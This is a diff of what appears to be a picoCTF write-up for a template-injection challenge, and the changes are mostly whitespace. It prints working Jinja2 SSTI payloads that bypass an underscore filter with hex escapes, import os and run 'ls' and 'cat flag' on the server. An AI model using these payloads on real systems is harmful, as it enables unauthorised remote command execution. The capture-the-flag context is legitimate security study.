@@ -1,6 +1,7 @@
 curl -I http://shape-facility.picoctf.net:59746/announce
 
 <img width="570" height="88" alt="Screenshot 2025-08-17 at 10 25 59 PM" src="https://github.com/user-attachments/assets/7a865d9f-eefc-4a9d-bcd4-20a8b5ff69b0" />
+
 ```
 # Script to craft payload
 
@@ -38,8 +39,9 @@ if r.status_code == 200:
             exit(0)
 
 ```
-try to print all of directories
 
+
+try to print all of directories
 ```
 {{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('ls')|attr('read')()}}
 ```
@@ -47,7 +49,6 @@ try to print all of directories
 <img width="1011" height="738" alt="Screenshot 2025-08-17 at 10 38 24 PM" src="https://github.com/user-attachments/assets/fa27a38b-ab5c-4f96-94c6-a6d130ac1711" />
 
 attempt to open flag
-
 ```
 {{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat flag')|attr('read')()}}
 ```
